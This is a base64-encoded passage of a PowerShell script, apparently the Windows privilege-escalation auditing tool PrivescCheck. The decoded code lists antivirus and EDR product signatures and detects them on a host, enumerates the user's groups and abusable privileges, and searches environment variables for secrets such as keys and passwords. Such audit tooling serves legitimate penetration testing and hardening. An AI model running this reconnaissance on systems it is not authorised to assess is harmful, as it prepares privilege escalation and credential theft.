CAgICAgICJLYXNwZXJza3kiICAgICAgICAgICAgICAgICAgICAgPSAia2FzcGVyc2t5IgogICAgICAgICJMYWN1bmEiICAgICAgICAgICAgICAgICAgICAgICAgPSAibGFjdW5hIgogICAgICAgICJNY0FmZWUiICAgICAgICAgICAgICAgICAgICAgICAgPSAibWNhZmVlIgogICAgICAgICJNb3JwaGlzZWMiICAgICAgICAgICAgICAgICAgICAgPSAibW9ycGhpc2VjIgogICAgICAgICJQcm9ncmFtIFByb3RlY3RvciIgICAgICAgICAgICAgPSAicHJvdGVjdG9yc2VydmljZSIKICAgICAgICAiUmVkIENhbmFyeSIgICAgICAgICAgICAgICAgICAgID0gImNhbmFyeSIKICAgICAgICAiUmVkIENsb2FrIiAgICAgICAgICAgICAgICAgICAgID0gInByb2N3YWxsLHJlZGNsb2FrLGN5Y2xvcmFtYSIKICAgICAgICAiU2VudGluZWxPbmUiICAgICAgICAgICAgICAgICAgID0gInNlbnRpbmVsIgogICAgICAgICJTb3Bob3MiICAgICAgICAgICAgICAgICAgICAgICAgPSAic29waG9zIgogICAgICAgICJTeW1hbnRlYyBFbmRwb2ludCBQcm90ZWN0aW9uIiAgPSAiZWVjdHJsLHNlbWxhdW5jaHN2YyxzZXBsaXZldXBkYXRlLHNpc2lkc3NlcnZpY2Usc2lzaXBzc2VydmljZSxzaXNpcHN1dGlsLHNtYy5leGUsc21jZ3VpLHNuYWM2NCxzcnRzcCxzeW1hbnRlYyxzeW1jb3JwdWksc3ltZWZhc2kiCiAgICAgICAgIlN5c2ludGVybmFscyBBbnRpdmlydXMiICAgICAgICA9ICJzeXNpbnRlcm5hbCIKICAgICAgICAiU3lzaW50ZXJuYWxzIFN5c21vbiIgICAgICAgICAgID0gInN5c21vbiIKICAgICAgICAiVGFuaXVtIEVuZm9yY2UiICAgICAgICAgICAgICAgID0gInRhbml1bSx0cHl0aG9uIgogICAgICAgICJUcmFwcyIgICAgICAgICAgICAgICAgICAgICAgICAgPSAiY3l2ZXJhLGN5c2VydmVyLGN5dHJheSxQYWxvQWx0b05ldHdvcmtzLHRkYS5leGUsdGRhd29yayIKICAgICAgICAiVHJlbmQgTWljcm8iICAgICAgICAgICAgICAgICAgID0gIm50cnRzY2FuLHRtbGlzdGVuLHRtYm1zcnYsdG1zc2NsaWVudCx0bWNjc2YsdHJlbmQiCiAgICAgICAgIldpbmRvd3MgRGVmZW5kZXIiICAgICAgICAgICAgICA9ICJkZWZlbmRlcixtc2FzY3VpbCxtc21wZW5nLG5pc3NydixzZWN1cml0eWhlYWx0aHNlcnZpY2UiCiAgICB9CgogICAgZnVuY3Rpb24gRmluZC1Qcm90ZWN0aW9uU29mdHdhcmUgewoKICAgICAgICBwYXJhbSgKICAgICAgICAgICAgW29iamVjdF0kT2JqZWN0CiAgICAgICAgKQoKICAgICAgICAkU2lnbmF0dXJlcy5LZXlzIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgJFByb2R1Y3ROYW1lID0gJF8KICAgICAgICAgICAgJFByb2R1Y3RTaWduYXR1cmVzID0gJFNpZ25hdHVyZXMuSXRlbSgkXykuU3BsaXQoIiwiKQoKICAgICAgICAgICAgJE9iamVjdCB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJFByb2R1Y3RTaWduYXR1cmVzIC1BbGxNYXRjaGVzIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgICAgICQoJF8gLVJlcGxhY2UgIkB7IikuVHJpbSgifSIpLlNwbGl0KCI7IikgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgICAgICRfLlRyaW0oKSB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJFByb2R1Y3RTaWduYXR1cmVzIC1BbGxNYXRjaGVzIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgICAgICAgICAgICAgJFNpZ25hdHVyZU1hdGNoID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAgICAgICAgICRTaWduYXR1cmVNYXRjaCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb2R1Y3ROYW1lIiAtVmFsdWUgIiRQcm9kdWN0TmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgJFNpZ25hdHVyZU1hdGNoIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGF0dGVybiIgLVZhbHVlICIkKCRfKSIKICAgICAgICAgICAgICAgICAgICAgICAgJFNpZ25hdHVyZU1hdGNoCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICMgTmVlZCB0byBzdG9yZSBhbGwgdGhlIHJlc3VsdHMgaW50byBvbmUgYXJyYXlsaXN0IHNvIHdlIGNhbiBzb3J0IHRoZW0gb24gdGhlIHByb2R1Y3QgbmFtZS4KICAgICRSZXN1bHRzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAKICAgICMgQ2hlY2sgRExMcyBsb2FkZWQgaW4gdGhlIGN1cnJlbnQgcHJvY2VzcwogICAgR2V0LVByb2Nlc3MgLUlkICRQSUQgLU1vZHVsZSB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkXy5GaWxlTmFtZSkgewoKICAgICAgICAgICAgJERsbERldGFpbHMgPSAoR2V0LUl0ZW0gJF8uRmlsZU5hbWUpLlZlcnNpb25JbmZvIHwgU2VsZWN0LU9iamVjdCAtUHJvcGVydHkgQ29tcGFueU5hbWUsRmlsZURlc2NyaXB0aW9uLEZpbGVOYW1lLEludGVybmFsTmFtZSxMZWdhbENvcHlyaWdodCxPcmlnaW5hbEZpbGVOYW1lLFByb2R1Y3ROYW1lCiAgICAgICAgICAgIEZpbmQtUHJvdGVjdGlvblNvZnR3YXJlIC1PYmplY3QgJERsbERldGFpbHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAKICAgICAgICAgICAgICAgICRSZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb2R1Y3ROYW1lIiAtVmFsdWUgIiQoJF8uUHJvZHVjdE5hbWUpIgogICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlNvdXJjZSIgLVZhbHVlICJMb2FkZWQgRExMIgogICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhdHRlcm4iIC1WYWx1ZSAiJCgkXy5QYXR0ZXJuKSIKICAgICAgICAgICAgICAgIFt2b2lkXSAkUmVzdWx0cy5BZGQoJFJlc3VsdCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAjIENoZWNrIHJ1bm5pbmcgcHJvY2Vzc2VzCiAgICBHZXQtUHJvY2VzcyB8IFNlbGVjdC1PYmplY3QgLVByb3BlcnR5IFByb2Nlc3NOYW1lLE5hbWUsUGF0aCxDb21wYW55LFByb2R1Y3QsRGVzY3JpcHRpb24gfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgIEZpbmQtUHJvdGVjdGlvblNvZnR3YXJlIC1PYmplY3QgJF8gfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAkUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QKICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb2R1Y3ROYW1lIiAtVmFsdWUgIiQoJF8uUHJvZHVjdE5hbWUpIgogICAgICAgICAgICAkUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU291cmNlIiAtVmFsdWUgIlJ1bm5pbmcgcHJvY2VzcyIKICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhdHRlcm4iIC1WYWx1ZSAiJCgkXy5QYXR0ZXJuKSIKICAgICAgICAgICAgW3ZvaWRdICRSZXN1bHRzLkFkZCgkUmVzdWx0KQogICAgICAgIH0KICAgIH0KCiAgICAjIENoZWNrIGluc3RhbGxlZCBhcHBsaWNhdGlvbnMgCiAgICBHZXQtSW5zdGFsbGVkUHJvZ3JhbXMgfCBTZWxlY3QtT2JqZWN0IC1Qcm9wZXJ0eSBOYW1lIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICBGaW5kLVByb3RlY3Rpb25Tb2Z0d2FyZSAtT2JqZWN0ICRfIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgJFJlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgICAgICRSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQcm9kdWN0TmFtZSIgLVZhbHVlICIkKCRfLlByb2R1Y3ROYW1lKSIKICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlNvdXJjZSIgLVZhbHVlICJJbnN0YWxsZWQgYXBwbGljYXRpb24iCiAgICAgICAgICAgICRSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQYXR0ZXJuIiAtVmFsdWUgIiQoJF8uUGF0dGVybikiCiAgICAgICAgICAgIFt2b2lkXSAkUmVzdWx0cy5BZGQoJFJlc3VsdCkKICAgICAgICB9CiAgICB9CgogICAgIyBDaGVjayBpbnN0YWxsZWQgc2VydmljZXMgCiAgICBHZXQtU2VydmljZUxpc3QgLUZpbHRlckxldmVsIDEgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgIEZpbmQtUHJvdGVjdGlvblNvZnR3YXJlIC1PYmplY3QgJF8gfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAkUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QKICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb2R1Y3ROYW1lIiAtVmFsdWUgIiQoJF8uUHJvZHVjdE5hbWUpIgogICAgICAgICAgICAkUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU291cmNlIiAtVmFsdWUgIlNlcnZpY2UiCiAgICAgICAgICAgICRSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQYXR0ZXJuIiAtVmFsdWUgIiQoJF8uUGF0dGVybikiCiAgICAgICAgICAgIFt2b2lkXSAkUmVzdWx0cy5BZGQoJFJlc3VsdCkKICAgICAgICB9CiAgICB9CgogICAgJFJlc3VsdHMgfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgUHJvZHVjdE5hbWUsU291cmNlCn0KCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEVORCBNSVNDICAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJFR0lOIENVUlJFTlQgVVNFUiAgIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZnVuY3Rpb24gSW52b2tlLVVzZXJDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgR2V0cyB0aGUgdXNlcm5hbmUgYW5kIFNJRCBvZiB0aGUgY3VycmVudCB1c2VyCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBHZXRzIHRoZSB1c2VybmFuZSBhbmQgU0lEIG9mIHRoZSBjdXJyZW50IHVzZXIKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1Vc2VyQ2hlY2sKCiAgICBOYW1lICAgICAgICAgICAgICAgICAgICAgU0lECiAgICAtLS0tICAgICAgICAgICAgICAgICAgICAgLS0tCiAgICBERVNLVE9QLUZFT0hOT01cbGFiLXVzZXIgUy0xLTUtMjEtMTQ0ODM2Njk3Ni01OTgzNTgwMDktMzg4MDU5NTE0OC0xMDAyCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQogICAgCiAgICAkQ3VycmVudFVzZXIgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkKCiAgICAkVXNlclJlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgJFVzZXJSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJEN1cnJlbnRVc2VyLk5hbWUgCiAgICAkVXNlclJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlNJRCIgLVZhbHVlICRDdXJyZW50VXNlci5Vc2VyIAogICAgJFVzZXJSZXN1bHQKfQoKZnVuY3Rpb24gSW52b2tlLVVzZXJHcm91cHNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgRW51bWVyYXRlcyBncm91cHMgdGhlIGN1cnJlbnQgdXNlciBiZWxvbmdzIHRvIGV4Y2VwdCBkZWZhdWx0IGFuZCBsb3ctcHJpdmlsZWdlZCBvbmVzCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBGb3IgZWFjaCBncm91cCB0aGUgY3VycmVudCB1c2VyIGJlbG9uZ3MgdG8sIGEgY3VzdG9tIG9iamVjdCBpcyByZXR1cm5lZCwgaW5kaWNhdGluZyB0aGUgbmFtZQogICAgYW5kIHRoZSBTSUQgb2YgdGhlIGdyb3VwLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLVVzZXJHcm91cHNDaGVjawoKICAgIE5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICAgU0lEICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIC0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIEJVSUxUSU5cUmVtb3RlIE1hbmFnZW1lbnQgVXNlcnMgUy0xLTUtMzItNTgwIAoKICAgIC5MSU5LCgogICAgaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC8yNDMzMzAvd2VsbC1rbm93bi1zZWN1cml0eS1pZGVudGlmaWVycy1pbi13aW5kb3dzLW9wZXJhdGluZy1zeXN0ZW1zCiAgICBodHRwczovL2RvY3MubWljcm9zb2Z0LmNvbS9lbi11cy9vcGVuc3BlY3Mvd2luZG93c19wcm90b2NvbHMvbXMtZHR5cC84MWQ5MmJiYS1kMjJiLTRhOGMtOTA4YS01NTRhYjI5MTQ4YWIKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICAkSWdub3JlZEdyb3VwU2lkcyA9IEAoCiAgICAgICAgIlMtMS0wIiwgICAgICAgICAgICAjIE51bGwgQXV0aG9yaXR5CiAgICAgICAgIlMtMS0wLTAiLCAgICAgICAgICAjIE5vYm9keQogICAgICAgICJTLTEtMSIsICAgICAgICAgICAgIyBXb3JsZCBBdXRob3JpdHkKICAgICAgICAiUy0xLTEtMCIsICAgICAgICAgICMgRXZlcnlvbmUKICAgICAgICAiUy0xLTIiLCAgICAgICAgICAgICMgTG9jYWwgQXV0aG9yaXR5CiAgICAgICAgIlMtMS0yLTAiLCAgICAgICAgICAjIExvY2FsCiAgICAgICAgIlMtMS0yLTEiLCAgICAgICAgICAjIENPTlNPTEVfTE9HT04KICAgICAgICAiUy0xLTMiLCAgICAgICAgICAgICMgQ3JlYXRvciBBdXRob3JpdHkKICAgICAgICAiUy0xLTMtMCIsICAgICAgICAgICMgQ3JlYXRvciBPd25lcgogICAgICAgICJTLTEtMy0xIiwgICAgICAgICAgIyBDcmVhdG9yIEdyb3VwCiAgICAgICAgIlMtMS0zLTIiLCAgICAgICAgICAjIE9XTkVSX1NFUlZFUgogICAgICAgICJTLTEtMy0zIiwgICAgICAgICAgIyBHUk9VUF9TRVJWRVIKICAgICAgICAiUy0xLTMtNCIsICAgICAgICAgICMgT3duZXIgUmlnaHRzCiAgICAgICAgIlMtMS01LTgwLTAiLCAgICAgICAjIE5UIFNlcnZpY2VzXEFsbCBTZXJ2aWNlcwogICAgICAgICJTLTEtNSIsICAgICAgICAgICAgIyBOVCBBdXRob3JpdHkKICAgICAgICAiUy0xLTUtMSIsICAgICAgICAgICMgRGlhbHVwCiAgICAgICAgIlMtMS01LTIiLCAgICAgICAgICAjIE5ldHdvcmsKICAgICAgICAiUy0xLTUtMyIsICAgICAgICAgICMgQmF0Y2gKICAgICAgICAiUy0xLTUtNCIsICAgICAgICAgICMgSW50ZXJhY3RpdmUKICAgICAgICAiUy0xLTUtNiIsICAgICAgICAgICMgU2VydmljZQogICAgICAgICJTLTEtNS03IiwgICAgICAgICAgIyBBbm9ueW1vdXMKICAgICAgICAiUy0xLTUtOCIsICAgICAgICAgICMgUFJPWFkKICAgICAgICAiUy0xLTUtMTAiLCAgICAgICAgICMgUHJpbmNpcGFsIFNlbGYKICAgICAgICAiUy0xLTUtMTEiLCAgICAgICAgICMgQXV0aGVudGljYXRlZCBVc2VycwogICAgICAgICJTLTEtNS0xMiIsICAgICAgICAgIyBSZXN0cmljdGVkIENvZGUKICAgICAgICAiUy0xLTUtMTUiLCAgICAgICAgICMgVEhJU19PUkdBTklaQVRJT04KICAgICAgICAiUy0xLTUtMTciLCAgICAgICAgICMgVGhpcyBPcmdhbml6YXRpb24KICAgICAgICAiUy0xLTUtMTgiLCAgICAgICAgICMgTG9jYWwgU3lzdGVtIAogICAgICAgICJTLTEtNS0xOSIsICAgICAgICAgIyBMb2NhbCBTZXJ2aWNlCiAgICAgICAgIlMtMS01LTIwIiwgICAgICAgICAjIE5ldHdvcmsgU2VydmljZQogICAgICAgICJTLTEtNS0zMi01NDUiLCAgICAgIyBVc2VycwogICAgICAgICJTLTEtNS0zMi01NDYiLCAgICAgIyBHdWVzdHMKICAgICAgICAiUy0xLTUtMzItNTU0IiwgICAgICMgQnVpbHRpblxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNzCiAgICAgICAgIlMtMS01LTgwLTAiLCAgICAgICAjIE5UIFNlcnZpY2VzXEFsbCBTZXJ2aWNlcwogICAgICAgICJTLTEtNS04My0wIiwgICAgICAgIyBOVCBWaXJ0dWFsIE1hY2hpbmVcVmlydHVhbCBNYWNoaW5lcwogICAgICAgICJTLTEtNS0xMTMiLCAgICAgICAgIyBMT0NBTF9BQ0NPVU5UCiAgICAgICAgIlMtMS01LTEwMDAiLCAgICAgICAjIE9USEVSX09SR0FOSVpBVElPTgogICAgICAgICJTLTEtMTUtMi0xIiAgICAgICAgIyBBTExfQVBQX1BBQ0tBR0VTCiAgICApIAoKICAgICRJZ25vcmVkR3JvdXBTaWRQYXR0ZXJucyA9IEAoCiAgICAgICAgIlMtMS01LTIxLSotNTEzIiwgICAjIERvbWFpbiBVc2VycwogICAgICAgICJTLTEtNS0yMS0qLTUxNCIsICAgIyBEb21haW4gR3Vlc3RzCiAgICAgICAgIlMtMS01LTIxLSotNTE1IiwgICAjIERvbWFpbiBDb21wdXRlcnMKICAgICAgICAiUy0xLTUtMjEtKi01MTYiLCAgICMgRG9tYWluIENvbnRyb2xsZXJzCiAgICAgICAgIlMtMS01LTIxLSotNTQ1IiwgICAjIFVzZXJzCiAgICAgICAgIlMtMS01LTIxLSotNTQ2IiwgICAjIEd1ZXN0cwogICAgICAgICJTLTEtNS02NC0qIiwgICAgICAgIyBOVExNIC8gU0NoYW5uZWwgLyBEaWdlc3QgQXV0aGVudGljYXRpb24KICAgICAgICAiUy0xLTE2LSoiLCAgICAgICAgICMgSW50ZWdyaXR5IGxldmVscyAKICAgICAgICAiUy0xLTE1LTMtKiIsICAgICAgICMgQ2FwYWJpbGl0aWVzICgiQWN0aXZlIERpcmVjdG9yeSBkb2VzIG5vdCByZXNvbHZlIGNhcGFiaWxpdHkgU0lEcyB0byBuYW1lcy4gVGhpcyBiZWhhdmlvciBpcyBieSBkZXNpZ24uIikKICAgICAgICAiUy0xLTE4LSoiICAgICAgICAgICMgSWRlbnRpdGllcwogICAgKQogICAgCiAgICAkQ3VycmVudFVzZXIgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkKICAgICRHcm91cHMgPSAkQ3VycmVudFVzZXIuR3JvdXBzIAoKICAgIEZvckVhY2ggKCRHcm91cCBpbiAkR3JvdXBzKSB7CgogICAgICAgICRHcm91cFNpZCA9ICRHcm91cC5WYWx1ZSAKCiAgICAgICAgaWYgKC1ub3QgKCRJZ25vcmVkR3JvdXBTaWRzIC1jb250YWlucyAkR3JvdXBTaWQpKSB7CgogICAgICAgICAgICAkS25vd25TaWQgPSAkRmFsc2UgCiAgICAgICAgICAgIEZvckVhY2ggKCRQYXR0ZXJuIGluICRJZ25vcmVkR3JvdXBTaWRQYXR0ZXJucykgewogICAgICAgICAgICAgICAgaWYgKCRHcm91cFNpZCAtbGlrZSAkUGF0dGVybikgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIktub3duIFNJRCBwYXR0ZXJuOiAkR3JvdXBTaWQiCiAgICAgICAgICAgICAgICAgICAgJEtub3duU2lkID0gJHRydWUKICAgICAgICAgICAgICAgICAgICBicmVhayAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoLW5vdCAkS25vd25TaWQpIHsKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAoJEdyb3VwLlRyYW5zbGF0ZShbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnRdKSkuVmFsdWUKICAgICAgICAgICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAiTi9BIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRVc2VyR3JvdXBzID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAkVXNlckdyb3VwcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkR3JvdXBOYW1lIAogICAgICAgICAgICAgICAgJFVzZXJHcm91cHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJTSUQiIC1WYWx1ZSAkR3JvdXBTaWQKICAgICAgICAgICAgICAgICRVc2VyR3JvdXBzCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJLbm93biBTSUQ6ICRHcm91cFNpZCIKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1Vc2VyUHJpdmlsZWdlc0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIAogICAgRW51bWVyYXRlcyBwcml2aWxlZ2VzIHdoaWNoIGNhbiBiZSBhYnVzZWQgZm9yIHByaXZpbGVnZSBlc2NhbGF0aW9uCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBFbnVtZXJhdGVzIGFsbCB0aGUgcHJpdmlsZWdlcyBvZiB0aGUgY3VycmVudCB1c2VyIHRoYW5rcyB0byB0aGUgY3VzdG9tIEdldC1Vc2VyUHJpdmlsZWdlcwogICAgZnVuY3Rpb24uIFRoZW4sIGl0IGNoZWNrcyB3aGV0aGVyIGVhY2ggcHJpdmlsZWdlIGlzIGNvbnRhaW5lZCBpbiBhIHByZS1kZWZpbmVkIGxpc3Qgb2YgCiAgICBoaWdoIHZhbHVlIHByaXZpbGVnZXMuIAogICAgCiAgICAuRVhBTVBMRQoKICAgIE5hbWUgICAgICAgICAgICAgICAgICAgU3RhdGUgICBEZXNjcmlwdGlvbgogICAgLS0tLSAgICAgICAgICAgICAgICAgICAtLS0tLSAgIC0tLS0tLS0tLS0tCiAgICBTZUltcGVyc29uYXRlUHJpdmlsZWdlIEVuYWJsZWQgSW1wZXJzb25hdGUgYSBjbGllbnQgYWZ0ZXIgYXV0aGVudGljYXRpb24KICAgIAogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpICAgIAoKICAgICRIaWdoUG90ZW50aWFsUHJpdmlsZWdlcyA9ICJTZUFzc2lnblByaW1hcnlUb2tlblByaXZpbGVnZSIsICJTZUltcGVyc29uYXRlUHJpdmlsZWdlIiwgIlNlQ3JlYXRlVG9rZW5Qcml2aWxlZ2UiLCAiU2VEZWJ1Z1ByaXZpbGVnZSIsICJTZUxvYWREcml2ZXJQcml2aWxlZ2UiLCAiU2VSZXN0b3JlUHJpdmlsZWdlIiwgIlNlVGFrZU93bmVyc2hpcFByaXZpbGVnZSIsICJTZVRjYlByaXZpbGVnZSIsICJTZUJhY2t1cFByaXZpbGVnZSIsICJTZU1hbmFnZVZvbHVtZVByaXZpbGVnZSIKCiAgICAkQ3VycmVudFByaXZpbGVnZXMgPSBHZXQtVXNlclByaXZpbGVnZXMKCiAgICBGb3JFYWNoICgkUHJpdmlsZWdlIGluICRDdXJyZW50UHJpdmlsZWdlcykgewoKICAgICAgICBpZiAoJEhpZ2hQb3RlbnRpYWxQcml2aWxlZ2VzIC1jb250YWlucyAkUHJpdmlsZWdlLk5hbWUpIHsKCiAgICAgICAgICAgICRQcml2aWxlZ2UKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1Vc2VyRW52Q2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyBmb3Igc2Vuc2l0aXZlIGRhdGEgaW4gZW52aXJvbm1lbnQgdmFyaWFibGVzCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBFbnZpcm9ubWVudCB2YXJpYWJsZXMgbWF5IGNvbnRhaW4gc2Vuc2l0aXZlIGluZm9ybWF0aW9uIHN1Y2ggYXMgZGF0YWJhc2UgY3JlZGVudGlhbHMgb3IgQVBJIAogICAga2V5cy4gCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKSAKCiAgICBbc3RyaW5nW11dICRLZXl3b3JkcyA9ICJrZXkiLCAicGFzc3ciLCAic2VjcmV0IiwgInB3ZCIsICJjcmVkcyIsICJjcmVkZW50aWFsIiwgImFwaSIKCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoIGVudjogfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICRFbnRyeU5hbWUgPSAkXy5OYW1lCiAgICAgICAgJEVudHJ5VmFsdWUgPSAkXy5WYWx1ZSAKICAgICAgICAkQ2hlY2tWYWwgPSAiJCgkXy5OYW1lKSAkKCRfLlZhbHVlKSIKICAgICAgICAKICAgICAgICBGb3JFYWNoICgkS2V5d29yZCBpbiAkS2V5d29yZHMpIHsKCiAgICAgICAgICAgIGlmICgkQ2hlY2tWYWwgLUxpa2UgIiokKCRLZXl3b3JkKSoiKSB7CgogICAgICAgICAgICAgICAgJEVudkl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgICAgICRFbnZJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSA